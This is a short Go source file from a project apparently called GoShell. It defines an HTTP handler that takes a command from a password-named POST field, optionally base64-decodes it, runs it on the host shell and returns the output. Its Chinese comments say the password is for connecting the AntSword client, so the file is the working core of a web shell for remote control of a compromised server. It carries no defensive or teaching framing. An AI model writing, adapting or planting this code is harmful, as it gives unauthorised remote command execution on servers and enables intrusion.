package server

import (
	"net/http"

	"github.com/Wd0g/GoShell/lib/common"
)

type Handler struct {
	Pwd     string // 蚁剑连接密码
	Decoder string // 请求内容解码方式
}

func (h Handler) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	var cmd string
	switch h.Decoder {
	case "base64":
		cmd = common.Base64Decode(req.PostFormValue(h.Pwd))
	case "plain":
		cmd = req.PostFormValue(h.Pwd)
	default:
		cmd = req.PostFormValue(h.Pwd)
	}

	if cmd == "" {
		return
	}

	res, _ := common.Shell(cmd)
	w.Write([]byte(res))

}
